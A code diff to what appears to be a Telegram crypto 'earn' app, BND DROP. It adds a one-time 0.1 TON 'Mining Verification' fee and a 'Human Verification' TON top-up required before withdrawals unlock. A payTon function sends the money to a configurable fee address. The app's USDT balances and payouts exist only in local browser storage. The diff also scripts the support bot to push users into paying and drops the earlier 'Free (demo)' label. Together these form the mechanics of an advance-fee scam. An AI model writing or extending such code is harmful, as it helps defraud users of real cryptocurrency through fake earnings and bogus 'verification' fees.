@@ -176,6 +176,11 @@
         </div>
       </div>
       <p style="margin-top:10px">Start mining and earn <b style="color:var(--green)">$0.50 USDT per day</b>, automatically. One session runs 24 hours — claim anytime.</p>
+      <div id="mineVerifyBox" style="background:rgba(245,185,66,.08);border:1px dashed rgba(245,185,66,.45);border-radius:13px;padding:12px 13px;margin-top:12px">
+        <b style="font-size:13.5px">Mining Verification required</b>
+        <p style="margin-top:3px">Pay a one-time verification fee of <b style="color:var(--gold2)">0.1 TON</b> to unlock mining forever. No fee again for new sessions.</p>
+        <button class="btn btn-join" id="mineVerifyBtn" style="width:100%;margin-top:10px">Pay 0.1 TON &amp; Verify</button>
+      </div>
       <div class="bar"><i id="mineBar"></i></div>
       <div class="mine-meta"><span id="mineState">Not started</span><span>Rate: $0.50 / day</span></div>
       <div class="btnrow">
@@ -252,16 +257,34 @@
 
     <div class="card">
       <h3>Withdraw USDT</h3>
-      <p>Minimum withdraw <b style="color:var(--gold2)">$10.00</b> • Network: <b style="color:var(--gold2)">BNB Chain (BEP20) only</b>. Requests are processed on schedule after review.</p>
-      <label>WALLET ADDRESS (BEP20)</label>
-      <input id="wdAddr" type="text" placeholder="0x..." autocomplete="off" spellcheck="false">
-      <label>AMOUNT (USDT)</label>
-      <input id="wdAmt" type="number" min="10" step="0.01" placeholder="10.00">
-      <button class="btn btn-wide" id="wdBtn">Request Withdraw</button>
-      <div class="chiprow">
-        <span class="chip">Min: <b>$10</b></span>
-        <span class="chip">Network: <b>BNB Chain</b></span>
-        <span class="chip">Fee: <b>Free (demo)</b></span>
+      <p>Withdraw activates at <b style="color:var(--gold2)">$5.00</b> balance • Network: <b style="color:var(--gold2)">BNB Chain (BEP20) only</b> • Fee: <b style="color:var(--gold2)">0.1%</b>. Requests are processed on schedule after review.</p>
+
+      <div id="wdLocked" style="background:rgba(255,107,107,.07);border:1px dashed rgba(255,107,107,.4);border-radius:13px;padding:12px 13px;margin-top:12px">
+        <b style="font-size:13.5px">Withdraw not active yet</b>
+        <p style="margin-top:3px">Your balance must reach <b style="color:var(--gold2)">$5.00</b> to activate withdraw. Current balance: <b id="wdLockedBal">$0.00</b></p>
+      </div>
+
+      <div id="wdVerify" style="display:none;background:rgba(245,185,66,.08);border:1px dashed rgba(245,185,66,.45);border-radius:13px;padding:12px 13px;margin-top:12px">
+        <b style="font-size:13.5px">Human Verification required</b>
+        <p style="margin-top:3px">To prove you are human, top up a minimum of <b style="color:var(--gold2)">$0.10 in TON</b> (one-time) from your TON wallet. Then withdraw unlocks.</p>
+        <button class="btn btn-join" id="humanVerifyBtn" style="width:100%;margin-top:10px">Top Up $0.10 TON &amp; Verify</button>
+      </div>
+
+      <div id="wdForm" style="display:none">
+        <label>WALLET ADDRESS (BEP20)</label>
+        <input id="wdAddr" type="text" placeholder="0x..." autocomplete="off" spellcheck="false">
+        <label>AMOUNT (USDT)</label>
+        <input id="wdAmt" type="number" min="5" step="0.01" placeholder="5.00">
+        <div class="chiprow">
+          <span class="chip">Fee (0.1%): <b id="wdFee">$0.00</b></span>
+          <span class="chip">You receive: <b id="wdReceive">$0.00</b></span>
+        </div>
+        <button class="btn btn-wide" id="wdBtn">Request Withdraw</button>
+        <div class="chiprow">
+          <span class="chip">Min: <b>$5</b></span>
+          <span class="chip">Network: <b>BNB Chain</b></span>
+          <span class="chip">Fee: <b>0.1%</b></span>
+        </div>
       </div>
     </div>
 
@@ -339,7 +362,13 @@ const CONFIG = {
   rewardPerTask: 0.50,
   referralReward: 0.30,
   miningPerDay: 0.50,
-  minWithdraw: 10,
+  minWithdraw: 5,
+  withdrawActivation: 5,
+  withdrawFeePct: 0.1,
+  humanVerifyTonUsd: 0.10,
+  miningFeeTon: 0.1,
+  tonUsdRate: 5.5,
+  feeTonAddress: "",
   promotePer200: 1,
   chainLabel: "BNB Chain (BEP20)",
   tonManifest: "https://hridoysoha.github.io/bnd-drop/tonconnect-manifest.json",
@@ -364,6 +393,8 @@ let S = JSON.parse(localStorage.getItem(KEY) || "null") || {
 if (!S.orders) S.orders = [];
 if (!S.mining) S.mining = { start:null, banked:0 };
 if (!S.supportMsgs) S.supportMsgs = [];
+if (S.miningVerified === undefined) S.miningVerified = false;
+if (S.humanVerified === undefined) S.humanVerified = false;
 
 const $ = id => document.getElementById(id);
 const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
@@ -413,8 +444,11 @@ function renderMining(){
   $("mineState").innerHTML = !running ? "Not started"
     : full ? "Session complete — claim your USDT"
     : '<span class="pulse"></span> Mining… ' + Math.floor((Date.now() - S.mining.start) / 60000) + " min running";
-  $("mineStartBtn").textContent = running ? "Mining…" : (full ? "Start New Session" : "Start Mining");
-  $("mineStartBtn").disabled = running && !full;
+  const locked = !S.miningVerified;
+  $("mineVerifyBox").style.display = locked ? "block" : "none";
+  $("mineStartBtn").textContent = locked ? "Locked — Verify First"
+    : running ? "Mining…" : (full ? "Start New Session" : "Start Mining");
+  $("mineStartBtn").disabled = locked || (running && !full);
   $("mineClaimBtn").disabled = claim <= 0;
   $("mineClaimBtn").textContent = claim > 0 ? "Claim $" + claim.toFixed(4) : "Claim";
 }
@@ -483,9 +517,10 @@ function render(){
   else wl.innerHTML = S.withdraws.map(w => `
     <div class="wd-item">
       <div><div class="a">$${fmt(w.amount)} USDT</div>
-      <div class="d">${w.address}<br>${w.date} • ${CONFIG.chainLabel}</div></div>
+      <div class="d">${w.address}<br>${w.date} • ${CONFIG.chainLabel}${w.fee !== undefined ? `<br>Fee 0.1%: $${w.fee.toFixed(3)} • You receive: $${fmt(w.net)}` : ""}</div></div>
       <span class="badge">${w.status}</span>
     </div>`).join("");
+  renderWithdraw();
 }
 
 /* ---------- Referral buttons ---------- */
@@ -500,18 +535,33 @@ $("refShareBtn").onclick = () => {
 };
 
 /* ---------- Withdraw ---------- */
+function renderWithdraw(){
+  const active = S.balance >= CONFIG.withdrawActivation;
+  $("wdLocked").style.display = active ? "none" : "block";
+  $("wdLockedBal").textContent = "$" + fmt(S.balance);
+  $("wdVerify").style.display = (active && !S.humanVerified) ? "block" : "none";
+  $("wdForm").style.display = (active && S.humanVerified) ? "block" : "none";
+}
+function wdCalc(){
+  const amt = parseFloat($("wdAmt").value);
+  const fee = isNaN(amt) ? 0 : amt * CONFIG.withdrawFeePct / 100;
+  $("wdFee").textContent = "$" + fee.toFixed(3);
+  $("wdReceive").textContent = "$" + (isNaN(amt) ? "0.00" : fmt(amt - fee));
+}
+$("wdAmt").addEventListener("input", wdCalc);
 $("wdBtn").onclick = () => {
   const addr = $("wdAddr").value.trim();
   const amt  = parseFloat($("wdAmt").value);
   if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) return toast("Enter a valid BEP20 address (0x…)", true);
   if (isNaN(amt) || amt < CONFIG.minWithdraw) return toast("Minimum withdraw is $" + CONFIG.minWithdraw.toFixed(2), true);
   if (amt > S.balance) return toast("Insufficient balance", true);
+  const fee = amt * CONFIG.withdrawFeePct / 100, net = amt - fee;
   S.balance -= amt;
-  S.withdraws.unshift({ amount:amt, address:addr, status:"Scheduled",
+  S.withdraws.unshift({ amount:amt, fee:fee, net:net, address:addr, status:"Scheduled",
     date:new Date().toLocaleDateString("en-GB",{day:"numeric",month:"short",year:"numeric"}) });
   save(); render();
-  $("wdAddr").value = ""; $("wdAmt").value = "";
-  toast("Withdraw request scheduled: $" + fmt(amt) + " USDT");
+  $("wdAddr").value = ""; $("wdAmt").value = ""; wdCalc();
+  toast("Withdraw scheduled: you receive $" + fmt(net) + " USDT");
 };
 
 $("resetBtn").onclick = () => {
@@ -527,6 +577,7 @@ $("resetBtn").onclick = () => {
         manifestUrl: CONFIG.tonManifest,
         buttonRootId: "tonConnectBtn"
       });
+      window.tonUI = ui;
       ui.onStatusChange(wallet => {
         if (wallet && wallet.account && wallet.account.address) {
           const a = wallet.account.address;
@@ -538,6 +589,37 @@ $("resetBtn").onclick = () => {
     status.textContent = "Open this app inside Telegram to connect TON wallet.";
   }
 })();
+
+/* ---------- TON payments (verification fees) ---------- */
+async function payTon(nanoTon, label){
+  /* Real payment when a receiving address is configured and a TON wallet is connected */
+  if (CONFIG.feeTonAddress && window.tonUI && window.tonUI.wallet) {
+    try {
+      await window.tonUI.sendTransaction({
+        validUntil: Math.floor(Date.now() / 1000) + 300,
+        messages: [{ address: CONFIG.feeTonAddress, amount: String(nanoTon) }]
+      });
+      return true;
+    } catch(e) { toast("TON payment cancelled or failed", true); return false; }
+  }
+  /* Demo mode: no receiving address configured yet */
+  return confirm(label + "\n\nDemo mode: simulate this TON payment now?");
+}
+$("mineVerifyBtn").onclick = async () => {
+  const ok = await payTon(Math.round(CONFIG.miningFeeTon * 1e9),
+    "Mining Verification — one-time fee of " + CONFIG.miningFeeTon + " TON");
+  if (!ok) return;
+  S.miningVerified = true; save(); renderMining();
+  toast("Mining verified — you can start mining now");
+};
+$("humanVerifyBtn").onclick = async () => {
+  const nano = Math.round(CONFIG.humanVerifyTonUsd / CONFIG.tonUsdRate * 1e9);
+  const ok = await payTon(nano,
+    "Human Verification — one-time top-up of $" + CONFIG.humanVerifyTonUsd.toFixed(2) + " in TON");
+  if (!ok) return;
+  S.humanVerified = true; save(); render();
+  toast("Human verified — withdraw is now unlocked");
+};
 
 /* ---------- Promote ---------- */
 function promoPrice(){ return parseInt($("promoMembers").value, 10) / 200 * CONFIG.promotePer200; }
@@ -569,9 +651,9 @@ $("promoBtn").onclick = () => {
 function agentReply(text){
   const t = text.toLowerCase();
   if (t.indexOf("withdraw") > -1 || t.indexOf("payout") > -1 || t.indexOf("cash") > -1)
-    return "To withdraw: open the Wallet tab, enter your BEP20 (BNB Chain) address and an amount of at least $10, then tap Request Withdraw. Requests are processed on schedule after review.";
+    return "To withdraw: first your balance must reach $5 to activate withdraw, then complete the one-time Human Verification (top up at least $0.10 in TON). After that, open the Wallet tab, enter your BEP20 (BNB Chain) address and amount (min $5). A 0.1% fee applies, and requests are processed on schedule.";
   if (t.indexOf("mining") > -1 || t.indexOf("mine") > -1)
-    return "Mining earns you $0.50 USDT per day. Tap Start Mining on the Home tab — one session runs 24 hours and you can claim your mined USDT to your balance anytime.";
+    return "Mining earns you $0.50 USDT per day. First complete the one-time Mining Verification (0.1 TON fee — paid only once), then tap Start Mining on the Home tab. One session runs 24 hours and you can claim your mined USDT anytime.";
   if (t.indexOf("refer") > -1 || t.indexOf("invite") > -1 || t.indexOf("friend") > -1)
     return "You earn +$0.30 USDT for every friend who joins BND DROP through your referral link. Your link is on the Home tab, under Refer & Earn — just copy and share it.";
   if (t.indexOf("promot") > -1 || t.indexOf("member") > -1 || t.indexOf("channel") > -1)
